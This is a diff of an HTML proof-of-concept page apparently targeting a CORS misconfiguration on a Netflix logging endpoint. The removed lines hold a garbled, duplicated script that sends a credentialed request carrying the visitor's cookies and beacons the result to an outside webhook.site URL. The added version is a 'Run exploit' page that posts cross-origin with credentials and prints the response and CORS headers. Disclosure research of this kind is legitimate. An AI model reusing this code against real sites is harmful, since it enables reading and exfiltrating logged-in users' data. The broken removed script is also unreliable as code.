@@ -1,93 +1,45 @@
 <!DOCTYPE html>
-<html><body>
-<script>
-(async () => {
-  /* 1)  Victim request (credentialed)  */
-  const r = await fetch('https://logs.netflix.com/log/www/cl/2', {
-    credentials: 'include'      // ← sends Netflix cookies
-  });
-<html>
-  <body>
-    <script>
-      (async () => {
-        try {
-          const payload = {
-            currentState: {
-              "4572197127044811": {
-                source: "www",
-                schema: { name: "netflixApp", version: "1.744.0" },
-                type: ["Log", "Session"],
-                id: 4572197127044811,
-                sequence: 1,
-                time: 1746874828147
-              },
-              "4572197459321564": {
-                nfvdid: "REDACTED",  // trimmed for safety
-                type: ["VisitorDeviceId", "AccountIdentity", "Session"],
-                id: 4572197459321564,
-                sequence: 4,
-                time: 1746874828147
-              }
-              // [Truncated – you can add the rest as needed]
-            },
-            reverseDeltas: [
-              [
-                {
-                  name: "LCP",
-                  id: 4572200327668136,
-                  delta: 3764,
-                  is_back_forward_cache_load: false,
-                  initial_pathname: "/browse",
-                  current_pathname: "/browse",
-                  type: ["WebVitalsLCP", "DiscreteEvent"],
-                  sequence: 65,
-                  time: 1746874838568
-                }
-              ]
-            ],
-            type: "CompactConsolidatedLoggingEnvelope",
-            version: 2,
-            clientSendTime: 1746874843576
-          };
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Netflix CORS PoC – logs endpoint</title>
+  <style>
+    body { font-family: monospace; background:#111; color:#eee; padding:2rem; }
+    button { padding:0.5rem 1rem; font-size:1rem; cursor:pointer; }
+    pre { background:#222; padding:1rem; border-radius:6px; max-height:400px; overflow:auto; }
+  </style>
+</head>
+<body>
+  <h2>Netflix CORS PoC – <code>logs.netflix.com/log/www/cl/2</code></h2>
 
-  /* 2)  Build minimal leak                        */
-  const leak = { status: r.status };   // status alone proves read‑access
-          const res = await fetch("https://logs.netflix.com/log/www/cl/2", {
-            method: "POST",
-            credentials: "include",
-            headers: {
-              "Content-Type": "application/json",
-              "X-Netflix.request.name": "ui/cl",
-              "X-Netflix.request.attempt": "1",
-              "X-Netflix.request.client.context": JSON.stringify({
-                appstate: "background"
-              })
-            },
-            body: JSON.stringify(payload)
-          });
+  <button onclick="doPoC()">Run exploit</button>
+  <pre id="out">Click the button to send a credentialed POST…</pre>
 
-  /* 3)  Fire‑and‑forget exfil via <img>  */
-  const beacon = new Image();
-  beacon.src =
-    'https://webhook.site/4e1148e7-6ade-4b05-86c9-fd4e86d6e8be'
-    + '?data=' + encodeURIComponent(JSON.stringify(leak));
-})();
-</script>
-<h3>PoC executed – check your Webhook inbox</h3>
-</body></html>
-          // Leak status to webhook
-          const beacon = new Image();
-          beacon.src =
-            "https://webhook.site/4e1148e7-6ade-4b05-86c9-fd4e86d6e8be" +
-            "?data=" + encodeURIComponent(JSON.stringify({ status: res.status }));
-        } catch (e) {
-          const beacon = new Image();
-          beacon.src =
-            "https://webhook.site/4e1148e7-6ade-4b05-86c9-fd4e86d6e8be" +
-            "?data=" + encodeURIComponent("error: " + e.message);
-        }
-      })();
-    </script>
-    <h3>PoC Executed – Check Webhook Inbox</h3>
-  </body>
+  <script>
+  async function doPoC() {
+    const $out = document.getElementById('out');
+    $out.textContent = '⏳ Sending…';
+
+    try {
+      const res = await fetch('https://logs.netflix.com/log/www/cl/2', {
+        method: 'POST',
+        credentials: 'include',          // ← send victim cookies AND allow response reading
+        mode: 'cors',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ poc: true })
+      });
+
+      const text = await res.text();
+
+      $out.textContent =
+        `Status : ${res.status}\n` +
+        `ACAO   : ${res.headers.get('access-control-allow-origin')}\n` +
+        `ACAC   : ${res.headers.get('access-control-allow-credentials')}\n\n` +
+        (text ? text : '(empty body)');
+    } catch (err) {
+      $out.textContent = '❌ Blocked or failed:\n' + err;
+    }
+  }
+  </script>
+</body>
 </html>
